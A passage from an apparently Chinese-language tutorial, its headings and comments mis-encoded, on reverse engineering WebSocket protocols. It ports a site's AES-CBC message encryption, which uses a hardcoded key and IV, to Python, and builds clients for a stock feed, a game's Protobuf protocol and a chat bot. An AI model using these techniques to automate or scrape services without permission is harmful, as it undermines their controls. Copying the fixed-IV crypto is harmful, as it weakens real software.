<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">encrypted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">AES</span><span class="p">.</span><span class="nx">encrypt</span><span class="p">(</span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">data</span><span class="p">),</span><span class="w"> </span><span class="nx">key</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">iv</span><span class="o">:</span><span class="w"> </span><span class="nx">iv</span><span class="p">,</span>
<span class="w">        </span><span class="nx">mode</span><span class="o">:</span><span class="w"> </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">mode</span><span class="p">.</span><span class="nx">CBC</span>
<span class="w">    </span><span class="p">});</span>
<span class="w">    </span><span class="nx">ws</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">encrypted</span><span class="p">.</span><span class="nx">toString</span><span class="p">());</span><span class="w">  </span><span class="c1">// Base64 æ ¼å¼</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p><strong>Python å¤ç°</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.Cipher</span><span class="w"> </span><span class="kn">import</span> <span class="n">AES</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.Util.Padding</span><span class="w"> </span><span class="kn">import</span> <span class="n">pad</span><span class="p">,</span> <span class="n">unpad</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>

<span class="k">class</span><span class="w"> </span><span class="nc">EncryptedWebSocketClient</span><span class="p">(</span><span class="n">WebSocketClient</span><span class="p">):</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">uri</span><span class="p">,</span> <span class="n">token</span><span class="p">):</span>
        <span class="nb">super</span><span class="p">()</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span><span class="n">uri</span><span class="p">,</span> <span class="n">token</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">key</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;1234567890abcdef&#39;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">iv</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;abcdef1234567890&#39;</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">encrypt_message</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;åŠ å¯†æ¶ˆæ¯&quot;&quot;&quot;</span>
        <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">iv</span><span class="p">)</span>
        <span class="n">plaintext</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
        <span class="n">encrypted</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">pad</span><span class="p">(</span><span class="n">plaintext</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">block_size</span><span class="p">))</span>
        <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">decrypt_message</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">encrypted_b64</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è§£å¯†æ¶ˆæ¯&quot;&quot;&quot;</span>
        <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">iv</span><span class="p">)</span>
        <span class="n">encrypted</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">encrypted_b64</span><span class="p">)</span>
        <span class="n">decrypted</span> <span class="o">=</span> <span class="n">unpad</span><span class="p">(</span><span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">encrypted</span><span class="p">),</span> <span class="n">AES</span><span class="o">.</span><span class="n">block_size</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">decrypted</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>

    <span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">send_message</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;å‘é€åŠ å¯†æ¶ˆæ¯&quot;&quot;&quot;</span>
        <span class="n">encrypted</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">encrypt_message</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
        <span class="k">await</span> <span class="bp">self</span><span class="o">.</span><span class="n">ws</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)</span>

    <span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">handle_message</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">message</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;å¤„ç†åŠ å¯†æ¶ˆæ¯&quot;&quot;&quot;</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">decrypted</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">decrypt_message</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[æ”¶åˆ°] </span><span class="si">{</span><span class="n">decrypted</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[é”™è¯¯] è§£å¯†å¤±è´¥: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="7-å®æˆ˜æ¡ˆä¾‹">7. å®æˆ˜æ¡ˆä¾‹</h2>

      <h3 id="æ¡ˆä¾‹-1è‚¡ç¥¨è¡Œæƒ…-websocket">æ¡ˆä¾‹ 1ï¼šè‚¡ç¥¨è¡Œæƒ… WebSocket</h3>

      <p><strong>ç›®æ ‡</strong>: è·å–å®æ—¶è‚¡ç¥¨ä»·æ ¼</p>

      <p><strong>åˆ†æè¿‡ç¨‹</strong>:</p>

      <ol>
        <li>Chrome DevTools æŠ“åŒ…ï¼Œå‘ç°æ¶ˆæ¯æ ¼å¼ä¸º JSON</li>
        <li>è§‚å¯Ÿæ¶ˆæ¯ç±»å‹:<br />
          <div class="codehilite"><br />
            <pre><span></span><code><span class="c1">// è®¢é˜…è‚¡ç¥¨</span><br />
<span class="p">{</span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;subscribe&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;symbols&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;AAPL&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;TSLA&quot;</span><span class="p">]}</span></li>
</ol>

<p><span class="c1">// æ¥æ”¶è¡Œæƒ…</span><br />
   <span class="p">{</span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;quote&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;symbol&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;AAPL&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;price&quot;</span><span class="p">:</span><span class="w"> </span><span class="mf">150.25</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;time&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1638360000</span><span class="p">}</span><br />
   </code></pre><br />
          </div>
          </p>

          <ol start="3">
            <li>å‘ç°éœ€è¦ç™»å½•åè·å– Token</li>
          </ol>

          <p><strong>å®Œæ•´è„šæœ¬</strong>:</p>

          <div class="codehilite">
            <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">asyncio</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">websockets</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>

<span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">stock_client</span><span class="p">():</span>
    <span class="c1"># 1. ç™»å½•è·å– Tokenï¼ˆçœç•¥ç™»å½•ä»£ç ï¼‰</span>
    <span class="n">token</span> <span class="o">=</span> <span class="s2">&quot;your_token_here&quot;</span>

    <span class="c1"># 2. è¿æ¥ WebSocket</span>
    <span class="n">uri</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;wss://quotes.example.com/stream?token=</span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s2">&quot;</span>
    <span class="k">async</span> <span class="k">with</span> <span class="n">websockets</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">uri</span><span class="p">)</span> <span class="k">as</span> <span class="n">ws</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;å·²è¿æ¥è‚¡ç¥¨è¡Œæƒ…æœåŠ¡å™¨&quot;</span><span class="p">)</span>

        <span class="c1"># 3. è®¢é˜…è‚¡ç¥¨</span>
        <span class="k">await</span> <span class="n">ws</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span>
            <span class="s2">&quot;type&quot;</span><span class="p">:</span> <span class="s2">&quot;subscribe&quot;</span><span class="p">,</span>
            <span class="s2">&quot;symbols&quot;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&quot;AAPL&quot;</span><span class="p">,</span> <span class="s2">&quot;TSLA&quot;</span><span class="p">,</span> <span class="s2">&quot;GOOG&quot;</span><span class="p">]</span>
        <span class="p">}))</span>

        <span class="c1"># 4. æ¥æ”¶è¡Œæƒ…</span>
        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
            <span class="n">message</span> <span class="o">=</span> <span class="k">await</span> <span class="n">ws</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
            <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>

            <span class="k">if</span> <span class="n">data</span><span class="p">[</span><span class="s2">&quot;type&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;quote&quot;</span><span class="p">:</span>
                <span class="n">symbol</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="s2">&quot;symbol&quot;</span><span class="p">]</span>
                <span class="n">price</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="s2">&quot;price&quot;</span><span class="p">]</span>
                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">symbol</span><span class="si">}</span><span class="s2">: $</span><span class="si">{</span><span class="n">price</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

            <span class="k">elif</span> <span class="n">data</span><span class="p">[</span><span class="s2">&quot;type&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;ping&quot;</span><span class="p">:</span>
                <span class="c1"># å“åº”å¿ƒè·³</span>
                <span class="k">await</span> <span class="n">ws</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s2">&quot;type&quot;</span><span class="p">:</span> <span class="s2">&quot;pong&quot;</span><span class="p">}))</span>

<span class="n">asyncio</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">stock_client</span><span class="p">())</span>
</code></pre>
          </div>

          <h3 id="æ¡ˆä¾‹-2æ¸¸æˆåè®®é€†å‘protobuf">æ¡ˆä¾‹ 2ï¼šæ¸¸æˆåè®®é€†å‘ï¼ˆProtobufï¼‰</h3>

          <p><strong>ç›®æ ‡</strong>: é€†å‘æŸåœ¨çº¿æ¸¸æˆçš„ WebSocket åè®®</p>

          <p><strong>åˆ†æè¿‡ç¨‹</strong>:</p>

          <ol>
            <li>æŠ“åŒ…å‘ç°æ˜¯äºŒè¿›åˆ¶æ¶ˆæ¯ï¼ˆOpcode = 0x2ï¼‰</li>
            <li>æœç´¢ JS ä»£ç ï¼Œæ‰¾åˆ° <code>proto</code> å¯¹è±¡å’Œ <code>.proto</code> å®šä¹‰</li>
            <li>æå– <code>.proto</code> æ–‡ä»¶å¹¶ä½¿ç”¨ <code>protoc</code> ç¼–è¯‘</li>
          </ol>

          <p><strong>.proto å®šä¹‰</strong>:</p>

          <div class="codehilite">
            <pre><span></span><code><span class="k">syntax</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;proto3&quot;</span><span class="p">;</span>

<span class="kd">message</span><span class="w"> </span><span class="nc">GameMessage</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">enum</span><span class="w"> </span><span class="n">Type</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="na">LOGIN</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">        </span><span class="na">MOVE</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<span class="w">        </span><span class="na">CHAT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="n">Type</span><span class="w"> </span><span class="na">type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<span class="w">    </span><span class="kt">int32</span><span class="w"> </span><span class="na">user_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span>
<span class="w">    </span><span class="kt">int64</span><span class="w"> </span><span class="na">timestamp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">3</span><span class="p">;</span>
<span class="w">    </span><span class="kt">bytes</span><span class="w"> </span><span class="na">payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">4</span><span class="p">;</span>
<span class="p">}</span>

<span class="kd">message</span><span class="w"> </span><span class="nc">MovePayload</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kt">float</span><span class="w"> </span><span class="na">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<span class="w">    </span><span class="kt">float</span><span class="w"> </span><span class="na">y</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span>
<span class="w">    </span><span class="kt">float</span><span class="w"> </span><span class="na">z</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">3</span><span class="p">;</span>
<span class="p">}</span>
</code></pre>
          </div>

          <p><strong>ç¼–è¯‘ .proto</strong>:</p>

          <div class="codehilite">
            <pre><span></span><code>protoc<span class="w"> </span>--python_out<span class="o">=</span>.<span class="w"> </span>game.proto
</code></pre>
          </div>

          <p><strong>Python å®¢æˆ·ç«¯</strong>:</p>

          <div class="codehilite">
            <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">asyncio</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">websockets</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">game_pb2</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>

<span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">game_client</span><span class="p">():</span>
    <span class="n">uri</span> <span class="o">=</span> <span class="s2">&quot;wss://game.example.com/ws&quot;</span>

    <span class="k">async</span> <span class="k">with</span> <span class="n">websockets</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">uri</span><span class="p">)</span> <span class="k">as</span> <span class="n">ws</span><span class="p">:</span>
        <span class="c1"># å‘é€ç™»å½•æ¶ˆæ¯</span>
        <span class="n">login_msg</span> <span class="o">=</span> <span class="n">game_pb2</span><span class="o">.</span><span class="n">GameMessage</span><span class="p">()</span>
        <span class="n">login_msg</span><span class="o">.</span><span class="n">type</span> <span class="o">=</span> <span class="n">game_pb2</span><span class="o">.</span><span class="n">GameMessage</span><span class="o">.</span><span class="n">LOGIN</span>
        <span class="n">login_msg</span><span class="o">.</span><span class="n">user_id</span> <span class="o">=</span> <span class="mi">12345</span>
        <span class="n">login_msg</span><span class="o">.</span><span class="n">timestamp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>
        <span class="k">await</span> <span class="n">ws</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">login_msg</span><span class="o">.</span><span class="n">SerializeToString</span><span class="p">())</span>

        <span class="c1"># å‘é€ç§»åŠ¨æ¶ˆæ¯</span>
        <span class="n">move_msg</span> <span class="o">=</span> <span class="n">game_pb2</span><span class="o">.</span><span class="n">GameMessage</span><span class="p">()</span>
        <span class="n">move_msg</span><span class="o">.</span><span class="n">type</span> <span class="o">=</span> <span class="n">game_pb2</span><span class="o">.</span><span class="n">GameMessage</span><span class="o">.</span><span class="n">MOVE</span>
        <span class="n">move_msg</span><span class="o">.</span><span class="n">user_id</span> <span class="o">=</span> <span class="mi">12345</span>
        <span class="n">move_msg</span><span class="o">.</span><span class="n">timestamp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>

        <span class="c1"># åµŒå…¥ç§»åŠ¨æ•°æ®</span>
        <span class="n">move_payload</span> <span class="o">=</span> <span class="n">game_pb2</span><span class="o">.</span><span class="n">MovePayload</span><span class="p">()</span>
        <span class="n">move_payload</span><span class="o">.</span><span class="n">x</span> <span class="o">=</span> <span class="mf">100.5</span>
        <span class="n">move_payload</span><span class="o">.</span><span class="n">y</span> <span class="o">=</span> <span class="mf">200.3</span>
        <span class="n">move_payload</span><span class="o">.</span><span class="n">z</span> <span class="o">=</span> <span class="mf">50.0</span>
        <span class="n">move_msg</span><span class="o">.</span><span class="n">payload</span> <span class="o">=</span> <span class="n">move_payload</span><span class="o">.</span><span class="n">SerializeToString</span><span class="p">()</span>

        <span class="k">await</span> <span class="n">ws</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">move_msg</span><span class="o">.</span><span class="n">SerializeToString</span><span class="p">())</span>

        <span class="c1"># æ¥æ”¶æ¶ˆæ¯</span>
        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
            <span class="n">data</span> <span class="o">=</span> <span class="k">await</span> <span class="n">ws</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
            <span class="n">msg</span> <span class="o">=</span> <span class="n">game_pb2</span><span class="o">.</span><span class="n">GameMessage</span><span class="p">()</span>
            <span class="n">msg</span><span class="o">.</span><span class="n">ParseFromString</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;æ”¶åˆ°æ¶ˆæ¯: type=</span><span class="si">{</span><span class="n">msg</span><span class="o">.</span><span class="n">type</span><span class="si">}</span><span class="s2">, user_id=</span><span class="si">{</span><span class="n">msg</span><span class="o">.</span><span class="n">user_id</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

<span class="n">asyncio</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">game_client</span><span class="p">())</span>
</code></pre>
          </div>

          <h3 id="æ¡ˆä¾‹-3èŠå¤©åº”ç”¨åè®®">æ¡ˆä¾‹ 3ï¼šèŠå¤©åº”ç”¨åè®®</h3>

          <p><strong>ç›®æ ‡</strong>: è‡ªåŠ¨å‘é€æ¶ˆæ¯åˆ°èŠå¤©å®¤</p>

          <p><strong>åˆ†æè¿‡ç¨‹</strong>:</p>

          <ol>
            <li>å‘ç°æ¶ˆæ¯æ ¼å¼ä¸º JSON</li>
            <li>éœ€è¦å…ˆè®¤è¯ï¼Œç„¶åä¿æŒå¿ƒè·³</li>
            <li>åºåˆ—å· (seq) å¿…é¡»é€’å¢</li>
          </ol>

          <p><strong>å®Œæ•´è„šæœ¬</strong>:</p>

          <div class="codehilite">
            <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">asyncio</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">websockets</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>

<span class="k">class</span><span class="w"> </span><span class="nc">ChatClient</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">username</span> <span class="o">=</span> <span class="n">username</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">password</span> <span class="o">=</span> <span class="n">password</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">seq</span> <span class="o">=</span> <span class="mi">0</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">ws</span> <span class="o">=</span> <span class="kc">None</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">next_seq</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ç”Ÿæˆä¸‹ä¸€ä¸ªåºåˆ—å·&quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">seq</span> <span class="o">+=</span> <span class="mi">1</span>
        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">seq</span>

    <span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">connect</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è¿æ¥å¹¶è®¤è¯&quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">ws</span> <span class="o">=</span> <span class="k">await</span> <span class="n">websockets</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="s2">&quot;wss://chat.example.com/ws&quot;</span><span class="p">)</span>

        <span class="c1"># å‘é€è®¤è¯æ¶ˆæ¯</span>
        <span class="k">await</span> <span class="bp">self</span><span class="o">.</span><span class="n">ws</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span>
            <span class="s2">&quot;seq&quot;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">next_seq</span><span class="p">(),</span>
            <span class="s2">&quot;type&quot;</span><span class="p">:</span> <span class="s2">&quot;auth&quot;</span><span class="p">,</span>
            <span class="s2">&quot;username&quot;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">username</span><span class="p">,</span>
            <span class="s2">&quot;password&quot;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">password</span>
        <span class="p">}))</span>

        <span class="c1"># ç­‰å¾…è®¤è¯å“åº”</span>
        <span class="n">response</span> <span class="o">=</span> <span class="k">await</span> <span class="bp">self</span><span class="o">.</span><span class="n">ws</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>

        <span class="k">if</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;type&quot;</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;auth_success&quot;</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;è®¤è¯æˆåŠŸ&quot;</span><span class="p">)</span>
            <span class="k">return</span> <span class="kc">True</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;è®¤è¯å¤±è´¥:&quot;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
            <span class="k">return</span> <span class="kc">False</span>

    <span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">send_chat</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">room_id</span><span class="p">,</span> <span class="n">message</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;å‘é€èŠå¤©æ¶ˆæ¯&quot;&quot;&quot;</span>
        <span class="k">await</span> <span class="bp">self</span><span class="o">.</span><span class="n">ws</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span>
            <span class="s2">&quot;seq&quot;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">next_seq</span><span class="p">(),</span>
            <span class="s2">&quot;type&quot;</span><span class="p">:</span> <span class="s2">&quot;chat&quot;</span><span class="p">,</span>
            <span class="s2">&quot;room_id&quot;</span><span class="p">:</span> <span class="n">room_id</span><span class="p">,</span>
            <span class="s2">&quot;message&quot;</span><span class="p">:</span> <span class="n">message</span><span class="p">,</span>
            <span class="s2">&quot;timestamp&quot;</span><span class="p">:</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">*</span> <span class="mi">1000</span><span class="p">)</span>
        <span class="p">}))</span>

    <span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">heartbeat_loop</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;å¿ƒè·³å¾ªç¯&quot;&quot;&quot;</span>
        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
            <span class="k">await</span> <span class="n">asyncio</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">30</span><span class="p">)</span>
            <span class="k">await</span> <span class="bp">self</span><span class="o">.</span><span class="n">ws</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span>
                <span class="s2">&quot;seq&quot;</span><span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">next_seq</span><span class="p">(),</span>
                <span class="s2">&quot;type&quot;</span><span class="p">:</span> <span class="s2">&quot;ping&quot;</span>
            <span class="p">}))</span>

    <span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">receive_loop</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ¥æ”¶æ¶ˆæ¯å¾ªç¯&quot;&quot;&quot;</span>
        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
            <span class="n">message</span> <span class="o">=</span> <span class="k">await</span> <span class="bp">self</span><span class="o">.</span><span class="n">ws</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
            <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[</span><span class="si">{</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;seq&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">] </span><span class="si">{</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;message&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

    <span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è¿è¡Œå®¢æˆ·ç«¯&quot;&quot;&quot;</span>
        <span class="k">if</span> <span class="k">await</span> <span class="bp">self</span><span class="o">.</span><span class="n">connect</span><span class="p">():</span>
            <span class="c1"># å‘é€æµ‹è¯•æ¶ˆæ¯</span>
            <span class="k">await</span> <span class="bp">self</span><span class="o">.</span><span class="n">send_chat</span><span class="p">(</span><span class="n">room_id</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">message</span><span class="o">=</span><span class="s2">&quot;Hello from bot!&quot;</span><span class="p">)</span>

            <span class="c1"># å¹¶å‘è¿è¡Œæ¥æ”¶å’Œå¿ƒè·³</span>
            <span class="k">await</span> <span class="n">asyncio</span><span class="o">.</span><span class="n">gather</span><span class="p">(</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">receive_loop</span><span class="p">(),</span>
